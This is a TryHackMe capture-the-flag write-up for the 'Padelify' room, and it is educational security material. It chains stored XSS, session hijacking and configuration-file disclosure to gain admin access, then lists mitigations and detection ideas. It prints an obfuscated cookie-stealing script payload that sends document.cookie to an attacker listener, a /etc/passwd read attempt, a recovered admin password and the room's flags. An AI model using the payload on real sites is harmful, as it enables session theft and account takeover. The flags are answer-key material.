# Padelify - TryHackMe Writeup

## Basic Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Machine Name | Padelify |
| Difficulty | Easy |
| Operating System | Linux |
| Category | Web Exploitation (Stored XSS, Session Hijacking, Local File Inclusion) |

---

# Introduction

Today we are solving another **TryHackMe Easy** machine named **Padelify**.

Unlike traditional Linux machines that require gaining an initial shell before privilege escalation, this challenge focuses entirely on **web application security**. Throughout the assessment we exploit a **Stored Cross-Site Scripting (Stored XSS)** vulnerability to steal a moderator's session cookie, hijack their authenticated session, enumerate the administrative functionality, abuse a **Local File Inclusion (LFI)** vulnerability to disclose sensitive configuration files, recover administrator credentials, and ultimately gain complete administrative access to the application.

This room demonstrates how seemingly low-risk web vulnerabilities can be chained together into a complete application compromise.

---

# Scenario

The room provides the following scenario:

> You've signed up for the Padel Championship, but your rival keeps climbing the leaderboard. The admin panel controls match approvals and registrations. Can you crack the admin and rewrite the draw before the whistle?

A status page is also available to reset the application if required.

---

# Objectives

During this assessment we aim to:

- Enumerate exposed services.
- Analyze the registration workflow.
- Discover Stored Cross-Site Scripting.
- Steal a moderator session.
- Hijack an authenticated session.
- Enumerate privileged functionality.
- Exploit Local File Inclusion.
- Recover administrator credentials.
- Obtain administrator access.

---

# Attack Methodology

The complete attack chain followed during this machine is shown below.

```
Reconnaissance
        │
        ▼
Port Enumeration
        │
        ▼
Website Enumeration
        │
        ▼
Registration Analysis
        │
        ▼
Stored XSS
        │
        ▼
Session Hijacking
        │
        ▼
Moderator Access
        │
        ▼
LFI Discovery
        │
        ▼
Configuration Disclosure
        │
        ▼
Administrator Login
```

---

# Initial Reconnaissance

The target machine IP is:

```
10.49.157.165
```

The first step is identifying all exposed services.

A full TCP scan is performed.

```bash
nmap -p- 10.49.157.165
```

Results:

```
22/tcp

80/tcp
```

Only SSH and HTTP are exposed.

Since SSH credentials are unavailable, the attack surface is primarily the web application.

---

# Service Enumeration

A service detection scan provides additional information.

```bash
nmap -sC -sV 10.49.157.165
```

Results:

```
22/tcp

OpenSSH 9.6

80/tcp

Apache/2.4.58
```

Additional observations:

- Apache 2.4.58
- Ubuntu
- PHP Session Cookies
- HttpOnly flag not enabled

One particularly interesting finding is:

```
PHPSESSID

HttpOnly

Not Set
```

Although this alone is not immediately exploitable, missing the **HttpOnly** attribute often becomes extremely valuable when Cross-Site Scripting vulnerabilities exist.

---

# Website Enumeration

Browsing to port 80 presents the **Padelify Tournament Registration** portal.

The application allows visitors to register for tournament participation.

Visible input fields include:

- Username
- Password
- Skill Level
- Game Type

At first glance the application appears relatively simple.

No administrative pages are immediately accessible.

This makes application logic testing the next priority.

---

# Request Analysis Using Burp Suite

Intercepting the registration request reveals a POST request.

```
POST

/register.php
```

Parameters:

```
username

password

level

game_type
```

Everything submitted by the user is accepted without obvious filtering.

Since tournament registrations commonly require moderator approval, there is a strong possibility that submitted usernames will later be viewed inside an administrative interface.

Whenever user-controlled input is rendered to privileged users, **Stored Cross-Site Scripting** becomes a likely attack vector.

---

# Understanding Stored XSS

Unlike Reflected XSS, Stored XSS permanently stores attacker-controlled input inside the application.

The workflow is:

```
Attacker

↓

Submit Payload

↓

Database

↓

Moderator Opens Page

↓

JavaScript Executes
```

Because the payload executes inside another user's browser, it inherits that user's privileges.

This makes Stored XSS one of the most dangerous client-side vulnerabilities.

---

# Testing for Cross-Site Scripting

Instead of submitting a normal username, a JavaScript payload is inserted.

Initial proof-of-concept payloads confirm that JavaScript execution is possible.

Once confirmed, the payload is modified to exfiltrate session cookies.

---

# Crafting the Payload

The payload uses JavaScript's `fetch()` function to transmit the victim's session cookie back to an attacker-controlled listener.

```html
<script>
eval("fet"+"ch('http://ATTACKER-IP:4444/'+document.cookie)")
</script>
```

To reduce simple signature detection, the word `fetch` is split before execution.

A similar approach is used with `document.cookie`.

The final payload is submitted through the registration form.

---

# Injecting the Payload

The malicious registration request resembles:

```text
POST /register.php

username=<script>...</script>

password=123das

level=amateur

game_type=single
```

Nothing unusual appears in the application's response.

This is expected because Stored XSS triggers only when another user later views the malicious content.

---

# Waiting for Moderator Interaction

Since registrations require moderation, it is reasonable to assume that an authenticated moderator periodically reviews new submissions.

Once the moderator opens the registration list, the injected JavaScript executes automatically inside their browser.

Instead of displaying an alert, the payload silently transmits:

```
document.cookie
```

to the attacker.

---

# Capturing the Session Cookie

A Netcat listener is started before submitting the payload.

```bash
nc -lvnp 4444
```

Shortly afterward, an incoming HTTP request is received.

Example:

```
GET

/PHPSESSID=37jranqmcoangn54888ohg7rlc
```

This confirms successful execution of the Stored XSS payload.

The moderator's authenticated session cookie has now been stolen.

---

# Understanding Session Hijacking

A web application identifies authenticated users using session cookies.

Normally:

```
User

↓

Login

↓

Server Issues Session

↓

Browser Stores Cookie
```

Every future request includes:

```
PHPSESSID
```

If an attacker obtains this cookie, they can impersonate the authenticated user without needing the password.

This attack is commonly known as **Session Hijacking**.

---

# Hijacking the Moderator Session

The stolen session value is imported into Burp Suite.

Replacing the existing cookie with:

```
PHPSESSID=37jranqmcoangn54888ohg7rlc
```

causes subsequent requests to inherit the moderator's authenticated session.

Refreshing the application immediately reveals moderator functionality.

No password cracking or authentication bypass is required.

The session cookie alone provides complete access.

---

# Moderator Dashboard

Access to the moderator panel confirms successful privilege escalation within the web application.

The application displays the first flag.

```
THM{Logged_1n_Moderat0r}
```

At this point we have successfully:

- Enumerated exposed services.
- Analyzed the registration workflow.
- Identified a Stored Cross-Site Scripting vulnerability.
- Crafted a malicious JavaScript payload.
- Executed JavaScript inside the moderator's browser.
- Stolen the moderator's authenticated session cookie.
- Performed session hijacking.
- Obtained moderator access.
- Captured the first flag.

The next phase focuses on enumerating moderator functionality, discovering the Local File Inclusion vulnerability, reading sensitive configuration files, recovering administrator credentials, obtaining full administrator access, and completing the challenge.

# Moderator Panel Enumeration

With moderator access successfully obtained, the next objective is determining whether additional vulnerabilities exist that can lead to full administrator compromise.

Inspecting the available functionality reveals several administrative features used for managing tournament registrations and matches.

One endpoint immediately attracts attention.

```
http://10.49.157.165/live.php?page=match.php
```

The presence of a parameter named:

```
page=
```

is commonly associated with file inclusion vulnerabilities.

This parameter becomes the next target for testing.

---

# Understanding Local File Inclusion

Local File Inclusion (LFI) occurs when an application loads files based on user-controlled input without proper validation.

Typical application behavior:

```
page=match.php

↓

include(match.php)

↓

Display Page
```

An attacker attempts to replace the legitimate filename with arbitrary files stored on the server.

Example:

```
page=/etc/passwd
```

If successful, sensitive files become accessible.

---

# Initial LFI Testing

The classic Linux target is:

```
/etc/passwd
```

Testing:

```
page=/etc/passwd
```

returns:

```
403 Forbidden
```

At first glance it appears the application blocks access to sensitive system files.

Instead of stopping here, further enumeration is performed.

---

# Directory Enumeration

Since direct file disclosure appears restricted, additional directories are fuzzed.

Interesting findings include:

```
/logs

/config
```

The logs directory exposes an interesting file.

```
error.log
```

---

# Reviewing Server Logs

Opening the log file reveals valuable information regarding application activity.

```
Server startup

Padelify v1.4.2
```

Another interesting entry appears.

```
Loading configuration from

/var/www/html/config/app.conf
```

Additional log entries reveal:

```
Possible encoded XSS payload

Database locked

Moderator login failures

Double encoded sequence

Live feed errors
```

One particular message immediately stands out.

```
Failed to parse

admin_info

/var/www/html/config/app.conf
```

The application itself discloses the exact location of its configuration file.

---

# Why Log Files Matter

Application logs frequently reveal:

- File paths
- Configuration locations
- Database names
- Usernames
- Stack traces
- Internal application logic

Developers rarely expect attackers to read these files.

For attackers, log disclosure often becomes the bridge toward complete compromise.

---

# Reading the Configuration File

Since the application already disclosed the configuration path, the next step is attempting to read it.

```
/config/app.conf
```

The file is successfully disclosed.

Contents include:

```text
version = "1.4.2"

enable_live_feed = true

enable_signup = true

env = "staging"

site_name = "Padelify Tournament Portal"

db_path = "padelify.sqlite"

admin_info = "bL}8,S9W1o44"

support_email = "support@padelify.thm"

build_hash = "a1b2c3d4"
```

---

# Sensitive Information Disclosure

Several sensitive values become immediately visible.

Configuration options include:

- Environment
- Database path
- Application version
- Internal notes
- Administrator information

The most valuable value recovered is:

```
admin_info

bL}8,S9W1o44
```

This appears to contain administrator credentials.

---

# Why Configuration Files Are Dangerous

Configuration files frequently store:

- Passwords
- API keys
- Database credentials
- Internal paths
- Secrets
- Encryption keys

Exposing these files often results in complete application compromise.

---

# Administrator Authentication

Using the recovered administrator information, authentication succeeds.

The application grants access to the administrator dashboard.

The second flag is displayed.

```
THM{Logged_1n_Adm1n001}
```

At this point the objective has been fully completed.

---

# Complete Attack Path

```
Internet
      │
      ▼
Nmap Enumeration
      │
      ▼
HTTP Application
      │
      ▼
Registration Form
      │
      ▼
Stored XSS
      │
      ▼
Moderator Opens Submission
      │
      ▼
JavaScript Executes
      │
      ▼
Session Cookie Theft
      │
      ▼
Session Hijacking
      │
      ▼
Moderator Panel
      │
      ▼
LFI Discovery
      │
      ▼
Log File Disclosure
      │
      ▼
Configuration File Disclosure
      │
      ▼
Admin Credentials
      │
      ▼
Administrator Login
      │
      ▼
Final Flag
```

---

# Security Weaknesses Identified

## 1. Stored Cross-Site Scripting (Stored XSS)

The registration form accepted arbitrary JavaScript without proper sanitization.

### Impact

- Session theft
- Credential theft
- Account takeover
- Privilege escalation

### Mitigation

- Output encoding
- Input validation
- Content Security Policy (CSP)
- HTML sanitization

---

## 2. Missing HttpOnly Cookie Flag

The application issued session cookies without the **HttpOnly** attribute.

### Impact

JavaScript could directly access:

```
document.cookie
```

making session theft trivial once XSS was achieved.

### Mitigation

Always enable:

- HttpOnly
- Secure
- SameSite

on authentication cookies.

---

## 3. Session Hijacking

Authentication depended entirely on possession of the session cookie.

### Impact

- Full account takeover
- No password required
- Persistent unauthorized access

### Mitigation

- Regenerate sessions after login
- Bind sessions to device characteristics
- Detect unusual session reuse

---

## 4. Local File Inclusion (LFI)

User-controlled input determined which files were loaded by the application.

### Impact

- Source code disclosure
- Configuration disclosure
- Credential leakage

### Mitigation

- Implement allowlists
- Avoid dynamic file inclusion
- Restrict file system access

---

## 5. Sensitive Information Disclosure

The application exposed internal configuration files containing administrator information.

### Impact

- Credential disclosure
- Environment disclosure
- Complete administrative compromise

### Mitigation

- Store secrets outside the web root
- Apply strict file permissions
- Never expose configuration files through the web application

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|------------|-----------|
| Active Scanning | T1595 |
| Exploit Public-Facing Application | T1190 |
| Stored XSS / Client-side Code Execution | T1059.007 |
| Steal Web Session Cookie | T1539 |
| Valid Accounts | T1078 |
| File and Directory Discovery | T1083 |
| Local File Inclusion (Application Exploitation) | T1190 |

---

# Detection Opportunities

Organizations should monitor for:

- HTML or JavaScript submitted through user input fields.
- Requests containing `<script>` tags or encoded JavaScript.
- Unexpected outbound requests initiated by administrator browsers.
- Sudden reuse of authenticated session cookies from different clients.
- Attempts to access configuration files through application parameters.
- Repeated traversal or LFI testing against dynamic page parameters.
- Requests targeting application log files and configuration directories.

Combining Web Application Firewall (WAF) rules, centralized logging, and anomaly detection can significantly reduce the likelihood of successful exploitation.

---

# Security Recommendations

To defend against attacks similar to those demonstrated in this room:

- Validate and sanitize all user-supplied input.
- Encode output before rendering it in HTML.
- Enforce a strict Content Security Policy (CSP).
- Mark authentication cookies with the **HttpOnly**, **Secure**, and **SameSite** attributes.
- Replace dynamic file inclusion with allowlisted routing.
- Store sensitive configuration files outside the document root.
- Restrict web server access to internal application files.
- Review logs regularly for attempted XSS and LFI exploitation.

---

# Lessons Learned

The **Padelify** challenge demonstrates how multiple low-to-medium severity web vulnerabilities can be chained together into a complete application compromise. A Stored Cross-Site Scripting vulnerability allowed execution of attacker-controlled JavaScript within a moderator's browser, resulting in session hijacking because the application's authentication cookie lacked the **HttpOnly** protection.

The compromised moderator account exposed additional functionality, eventually leading to the discovery of a Local File Inclusion vulnerability. By leveraging log disclosure and configuration file access, sensitive administrator information was recovered, allowing complete administrative control of the application without exploiting the underlying operating system.

This machine highlights the importance of secure session management, proper input validation, output encoding, and protecting sensitive configuration files from unauthorized access.

---

# Conclusion

**Padelify** is an excellent beginner-friendly web exploitation challenge that demonstrates how seemingly independent vulnerabilities can be chained into a full application compromise. Starting from a Stored Cross-Site Scripting vulnerability, we successfully stole a moderator's session cookie, hijacked an authenticated session, enumerated privileged functionality, exploited a Local File Inclusion vulnerability to disclose sensitive configuration files, recovered administrator credentials, and obtained full administrator access.

The room reinforces several important secure development principles, including the need for robust input validation, secure session management, least privilege, and proper protection of application configuration files. Overall, Padelify provides practical experience with modern web application exploitation while highlighting how small implementation flaws can collectively lead to complete compromise.
